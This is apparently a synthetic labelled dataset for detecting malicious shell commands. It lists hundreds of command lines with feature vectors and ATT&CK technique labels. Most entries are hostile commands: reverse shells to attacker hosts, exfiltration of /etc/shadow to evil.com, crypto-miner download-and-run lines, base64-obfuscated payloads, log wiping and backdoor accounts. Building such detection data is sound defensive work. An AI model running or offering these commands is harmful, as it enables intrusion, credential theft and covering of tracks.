nohup echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nc  -e  /bin/bash  attacker.com  80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo ip link show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
cat /etc/os-release && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""getent group sudo""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
at now + 1 minute <<< '/tmp/payload' && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat ~/.aws/credentials | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nc -e /bin/bash attacker.com 80 ; echo done,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemctl  restart  nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""su -s /bin/bash www-data""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
groups $(whoami) && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup find /var/log -name '*.log' -exec truncate -s 0 {} \; &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""nc -e /bin/bash attacker.com 80 && sleep 1""","[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'c3NoIC1MIDgwODA6aW50ZXJuYWw6ODAgdXNlckBqdW1wLmhvc3Q=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo curl -s http://c2.attacker.com/beacon && chmod +x /tmp/payload,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -m -s /bin/bash hacker && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo systemctl enable --now malicious.service,"[0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1053_Scheduled_Task'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""curl -X POST http://evil.com/collect -d @/etc/shadow""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""ss -anp""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
sudo su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
curl  -sL  http://evil.com/xmrig  |  bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo  -e  '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ./pwnkit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup at now + 1 minute <<< '/tmp/payload' && history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time find / -writable -type d 2>/dev/null ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'bGFzdCAtbiAxMA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvdmFyL2xvZyAtbmFtZSAnKi5sb2cnIC1leGVjIHRydW5jYXRlIC1zIDAge30gXDs=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"sudo python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
w  |  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc  -zv  10.0.0.1  1-1000  2>&1  |  grep  succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
sudo echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
time service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'aGVsbG8=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC45OSIsNDQ0NCk7IC4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  hello  world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time > ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
export  LANG=en_US.UTF-8,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
lscpu | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup tar -czf backup.tar.gz /home/user &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh  &&  history  -c,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe && history -c,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'aGVsbG8=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup getent passwd | awk -F: '$3 >= 1000' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
uname -a && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.68, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup wmic useraccount list &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
net user /add attacker P@ssw0rd ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
time net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""bash -i >& /dev/tcp/10.0.0.99/4444 0>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe && history -c,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQgfCBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
git  clone  https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup history -c && history -w &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
ip route show | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'c3RyaW5ncyAvcHJvYy8qL21lbSB8IGdyZXAgLWkgcGFzc3dvcmQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
id  -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
export LANG=en_US.UTF-8,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
